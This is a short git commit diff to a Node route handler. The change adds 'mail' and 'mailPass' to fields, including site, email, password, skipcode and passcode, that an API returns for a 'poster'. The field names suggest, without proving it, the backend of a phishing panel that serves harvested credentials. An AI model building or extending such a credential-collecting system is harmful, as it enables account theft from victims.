f778939bf36ddbb24f6a09434f003a740a56e05a
rana <rana.buddy@gmail.com>
2023-05-07 10:12:39 +0600

    feat:https added

--- routes/routehandler.js
+++ routes/routehandler.js
@@ -455,7 +455,7 @@ export const poster_details = async (req, res) => {
 
         const data = await Poster.findOne({ _id: id })
             .select('username password posterId links details')
-            .populate('details', 'site email password skipcode username passcode').sort({ createdAt: -1 })
+            .populate('details', 'site email password skipcode username passcode mail mailPass').sort({ createdAt: -1 })
         return res.status(200).json({ data: data })
 
 
